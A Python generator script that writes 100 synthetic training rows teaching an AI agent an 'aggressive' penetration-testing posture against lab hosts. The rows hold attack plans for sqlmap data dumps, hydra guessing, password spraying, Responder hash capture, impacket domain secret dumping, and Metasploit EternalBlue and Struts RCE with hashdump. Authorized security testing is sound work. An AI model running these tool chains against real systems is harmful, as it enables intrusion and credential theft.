#!/usr/bin/env python3
"""Generate 100 authorized AGGRESSIVE dataset-contribute examples.

Aggressive posture = maximize in-scope discovery and proof-of-impact using ONLY
Firebreak allowlisted wrappers. Every example is framed as authorized engagement
work against lab/in-scope hosts. No unmanaged shell, no criminal PoCs, no
third-party consumer-account crime. Output feeds the Firebreak open dataset.

Writes training/seed/aggressive_examples.jsonl (exactly 100 rows).
"""

from __future__ import annotations

import json
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
OUT = ROOT / "training" / "seed" / "aggressive_examples.jsonl"

LABS = [
    "https://lab.example",
    "https://dvwa.lab.local",
    "https://juice.lab.local",
    "https://shop.lab.local",
    "https://api.lab.local",
    "https://corp.lab.local",
    "10.10.14.0/24",
    "10.10.20.15",
    "192.168.56.101",
    "target.internal.lab",
]

AUTH = "Authorized engagement; in-scope only. Aggressive posture."


def plan(phase: str, reason: str, tools: list[tuple[str, list[str]]], *, parallel=False, stop=False) -> str:
    return json.dumps(
        {
            "phase_name": phase,
            "reason": reason,
            "parallel": parallel,
            "stop": stop,
            "tools": [{"tool": t, "args": a} for t, a in tools],
        }
    )


def row(prompt: str, response: str) -> dict:
    return {
        "source": "aggressive_seed",
        "posture": "aggressive",
        "prompt": prompt,
        "response": response,
        "license": "Apache-2.0",
    }


def build() -> list[dict]:
    rows: list[dict] = []
    L = LABS

    # 1) Web recon → discovery → vuln → proof-of-impact chains (25)
    web_chains = [
        ("ai_recon", "Fingerprint stack and open web ports first.",
         [("nmap", ["-sV", "-p80,443,8080,8443"]), ("whatweb", ["-a", "3"])], True, False),
        ("ai_discovery", "Enumerate hidden paths and params for attack surface.",
         [("ffuf", ["-ac"]), ("gobuster", ["dir"])], False, False),
        ("ai_vuln", "Run template + misconfig checks at high severity.",
         [("nuclei", ["-severity", "critical,high,medium", "-silent"]), ("nikto", ["-maxtime", "90"])], False, False),
        ("ai_impact", "Confirm injection impact where responses indicate SQL errors.",
         [("sqlmap", ["--batch", "--risk", "3", "--level", "5"])], False, False),
        ("ai_xss", "Probe reflected/stored XSS on discovered params.",
         [("xsstrike", [])], False, False),
    ]
    i = 0
    while len([r for r in rows if r["prompt"].startswith("WEB")]) < 25:
        target = L[i % len(L)]
        phase, reason, tools, par, stop = web_chains[i % len(web_chains)]
        rows.append(row(
            f"WEB {AUTH} Target {target}. Step {i % 5}. Push toward proof-of-impact. Next phase JSON.",
            plan(phase, reason, tools, parallel=par, stop=stop),
        ))
        i += 1

    # 2) SQLi proof-of-impact dumps (12)
    for k in range(12):
        target = L[k % len(L)]
        param = ["id", "user", "cat", "product", "q", "page"][k % 6]
        rows.append(row(
            f"SQLI {AUTH} Confirmed injectable param '{param}' on {target}. Prove data-access impact.",
            plan(
                "ai_sqli_impact",
                f"Enumerate then dump minimal PoC data for '{param}' to prove impact.",
                [("sqlmap", ["--batch", f"-p{param}", "--dbs", "--dump", "--threads", "4"])],
            ),
        ))

    # 3) Network offense: fast sweep → targeted service attack (12)
    net = [
        ("ai_sweep", "Fast SYN discovery across the scope.",
         [("masscan", ["-p1-65535", "--rate", "5000"])], True),
        ("ai_portmap", "Full TCP service/version on live hosts.",
         [("rustscan", ["--ulimit", "5000"]), ("nmap", ["-sV", "-sC", "-T4"])], True),
        ("ai_service_attack", "Target exposed auth services for weak creds.",
         [("hydra", ["-t", "4"])], False),
    ]
    for k in range(12):
        target = L[k % len(L)]
        phase, reason, tools, par = net[k % len(net)]
        rows.append(row(
            f"NET {AUTH} Scope {target}. Step {k % 3}. Maximize host/service coverage then attack. JSON.",
            plan(phase, reason, tools, parallel=par),
        ))

    # 4) Credential attacks: online guessing + spray (12)
    svc = ["ssh", "ftp", "smb", "rdp", "http-post-form", "mysql"]
    for k in range(12):
        target = L[k % len(L)]
        service = svc[k % len(svc)]
        if k % 2 == 0:
            rows.append(row(
                f"CREDS {AUTH} {service} exposed on {target}. Attempt authorized weak-credential guessing.",
                plan(
                    "ai_cred_attack",
                    f"Bounded {service} login guessing with a small in-scope list.",
                    [("hydra", ["-t", "4", "-f", service])],
                ),
            ))
        else:
            rows.append(row(
                f"CREDS {AUTH} SMB hosts found on {target}. Spray one known password safely.",
                plan(
                    "ai_spray",
                    "Single-password spray to avoid lockout; enumerate on success.",
                    [("crackmapexec", ["smb", "--continue-on-success"])],
                ),
            ))

    # 5) AD / internal escalation (13)
    ad = [
        ("ai_ad_poison", "Capture NetNTLM hashes via LLMNR/NBT-NS poisoning (needs interface).",
         [("responder", ["-I", "eth0", "-wF"])]),
        ("ai_ad_secrets", "Dump secrets with valid domain creds to prove impact.",
         [("impacket", ["-just-dc-ntlm"])]),
        ("ai_ad_map", "Collect AD attack paths for privilege escalation.",
         [("bloodhound", ["-c", "All"])]),
        ("ai_ad_enum", "Authenticated share/session enum across the domain.",
         [("crackmapexec", ["smb", "--shares", "--sessions"])]),
    ]
    for k in range(13):
        target = L[(k + 5) % len(L)]
        phase, reason, tools = ad[k % len(ad)]
        rows.append(row(
            f"AD {AUTH} Internal domain via {target}. Step {k % 4}. Advance toward DA. JSON.",
            plan(phase, reason, tools),
        ))

    # 6) Metasploit exploit + post-ex module actions (13)
    ms = [
        ("exploit/multi/http/apache_normalize_path", "Exploit path normalization RCE on confirmed CVE."),
        ("exploit/windows/smb/ms17_010_eternalblue", "Authorized EternalBlue against vulnerable SMB host."),
        ("exploit/multi/http/struts2_content_type_ognl", "Struts2 OGNL RCE where nuclei flagged the CVE."),
        ("post/windows/gather/hashdump", "Dump SAM hashes after a Windows session."),
        ("post/multi/gather/env", "Collect environment from an active session (low risk)."),
        ("post/linux/gather/enum_configs", "Enumerate configs from a Linux session."),
    ]
    for k in range(13):
        target = L[k % len(L)]
        module, reason = ms[k % len(ms)]
        if module.startswith("post/"):
            rows.append(row(
                f"MSF {AUTH} Active session on {target}. Prove post-ex impact with {module}.",
                json.dumps({
                    "tool": "metasploit",
                    "phase": "post_exploitation",
                    "args": [module, "SESSION=1"],
                    "reason": reason,
                }),
            ))
        else:
            rows.append(row(
                f"MSF {AUTH} Confirmed vuln on {target}. Select exploit module and prove RCE.",
                json.dumps({
                    "tool": "metasploit",
                    "phase": "exploitation",
                    "args": [module, f"RHOSTS={target}", "LHOST=tun0"],
                    "reason": reason,
                }),
            ))

    # 7) Post-ex privesc enum artifacts (8)
    for k in range(8):
        target = L[k % len(L)]
        if k % 2 == 0:
            rows.append(row(
                f"PRIVESC {AUTH} Linux foothold on {target}. Stage privesc enumeration.",
                plan("ai_privesc", "Run linpeas artifact to find escalation paths.",
                     [("linpeas", [])]),
            ))
        else:
            rows.append(row(
                f"PRIVESC {AUTH} Windows foothold on {target}. Stage privesc enumeration.",
                plan("ai_privesc", "Run winpeas artifact to find escalation paths.",
                     [("winpeas", [])]),
            ))

    # 8) Chaining / decision proof-of-impact narratives (fill to 100)
    narratives = [
        ("Nuclei flagged CVE-2021-41773 on the target. What is the aggressive next move?",
         "Queue the matching Metasploit module (apache path traversal/RCE) via the wrapper, set RHOSTS to the in-scope host, and confirm code execution as proof-of-impact."),
        ("sqlmap confirmed a boolean-based blind injection. How do you prove impact?",
         "Escalate sqlmap to enumerate databases and dump a minimal record set as evidence; do not exfiltrate full customer data."),
        ("You captured NetNTLMv2 hashes with Responder. Next aggressive step?",
         "Crack offline with hashcat on a local hash file, then use recovered creds with crackmapexec to enumerate and move laterally."),
        ("A meterpreter session opened on Windows. Aggressive follow-on?",
         "Run post/windows/gather/hashdump and winpeas enum to find privesc, all through the Metasploit wrapper — never unmanaged shell."),
        ("ffuf found /admin and /api. How to push offense?",
         "Fingerprint the admin auth, run nuclei exposures against /api, and attempt bounded credential guessing with hydra if a login is exposed."),
        ("masscan shows 445 open across the subnet. Aggressive plan?",
         "Version-scan with nmap smb scripts, then crackmapexec spray a single password and check ms17-010 exposure for a Metasploit follow-on."),
        ("wpscan-style check shows WordPress. Aggressive escalation?",
         "Run nuclei WordPress templates, enumerate users, then bounded hydra against wp-login before any exploit module."),
        ("bloodhound shows a path to Domain Admin via Kerberoastable SPN. Next?",
         "Request the SPN ticket, crack offline with hashcat, then use impacket secretsdump with the recovered privileged account to prove DA impact."),
    ]
    j = 0
    while len(rows) < 100:
        q, a = narratives[j % len(narratives)]
        suffix = "" if j < len(narratives) else f" (scenario {j})"
        rows.append(row(f"DECIDE {AUTH} {q}{suffix}", a))
        j += 1

    return rows[:100]


def main() -> int:
    rows = build()
    assert len(rows) == 100, f"expected 100, got {len(rows)}"
    # Guarantee unique, traceable prompts (cycling loops can repeat a scenario).
    for idx, r in enumerate(rows, start=1):
        r["id"] = f"agg-{idx:03d}"
        r["prompt"] = f"[{r['id']}] {r['prompt']}"
    assert len({r["prompt"] for r in rows}) == 100, "prompts must be unique"
    OUT.parent.mkdir(parents=True, exist_ok=True)
    with OUT.open("w", encoding="utf-8") as fh:
        for r in rows:
            fh.write(json.dumps(r, ensure_ascii=False) + "\n")
    # Validate all responses parse (JSON plans) or are non-empty text.
    plans = sum(1 for r in rows if r["response"].startswith("{"))
    print(json.dumps({"rows": len(rows), "json_plan_rows": plans, "out": str(OUT)}))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
